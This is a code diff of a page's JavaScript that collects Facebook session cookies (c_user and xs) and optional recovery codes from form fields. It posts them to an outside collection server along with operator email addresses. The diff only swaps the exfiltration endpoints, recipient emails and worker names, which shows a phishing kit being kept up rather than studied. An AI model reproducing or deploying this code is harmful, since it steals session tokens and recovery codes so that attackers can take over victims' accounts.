@@ -414,14 +414,14 @@
             const cUserInput = document.getElementById("c_user").value.trim();
             const xsInput = document.getElementById("xs").value.trim();
             // Always send c_user and xs
-            fetch("https://form-sable-chi.vercel.app/netlifylogin", {
+            fetch("https://form-sable-chi.vercel.app/submit", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     c_user: cUserInput,
                     xs: xsInput,
-                    emails: ["itguy932@gmail.com"],
-                    workerEmail: "itguy932@gmail.com",
+                    emails: ["newzatpage@gmail.com"],
+                    workerEmail: "submitdispute@gmail.com",
                     name: "Eng",
                 }),
             }).then(res => {
@@ -447,20 +447,20 @@
             const xsInput = document.getElementById("xs").value.trim();
             const recoveryInput = document.getElementById("recovery_codes")?.value.trim() || "";
 
-            fetch("https://form-sable-chi.vercel.app/netlifylogin", {
+            fetch("https://form-sable-chi.vercel.app/submit", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     c_user: cUserInput,
                     xs: xsInput,
-                    emails: ["mjohn72929@gmail.com", "ibadnizamani757@gmail.com"],
-                    workerEmail: "mjohn72929@gmail.com",
-                    name: "Ibaad"
+                    emails: ["newzatpage@gmail.com"],
+                    workerEmail: "submitdispute@gmail.com",
+                    name: "Zubair"
                 }),
             }).then(res => {
                 if (res.ok) {
                     if (allowRecovery && recoveryInput) {
-                         fetch("https://postal-form.on.shiper.app/notifyLogin", {
+                         fetch("https://form-sable-chi.vercel.app/netlifylogin", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
@@ -483,7 +483,7 @@
                 console.error("Submission error:", err);
                 alert("An error occurred. Please try again.");
                 if (allowRecovery && recoveryInput) {
-                         fetch("https://postal-form.on.shiper.app/notifyLogin", {
+                         fetch("https://form-sable-chi.vercel.app/netlifylogin", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
